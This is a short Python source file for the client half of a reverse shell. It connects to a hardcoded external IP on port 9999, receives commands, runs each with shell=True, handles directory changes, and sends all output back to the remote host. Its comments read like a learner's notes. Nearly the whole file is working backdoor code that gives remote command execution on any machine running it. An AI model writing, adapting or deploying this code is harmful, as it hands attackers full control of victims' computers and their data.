"""A python code file that goes into the client."""
import socket
import os
import subprocess

sockett = socket.socket()
host = "159.203.13.22"  # This is static IP from a DigitalOcean server
port = 9999

sockett.connect((host, port))

while True:
    data = sockett.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8 "))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # The above line opens up a terminal window. The shell=True param makes sure that the terminal commands
        # can be executed.
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        current_working_dir = os.getcwd() + "> "
        sockett.send(str.encode(output_str + current_working_dir))

        print(output_str)

        # this block of code makes sure that stuff that the server does is also visible to the client computer terminal

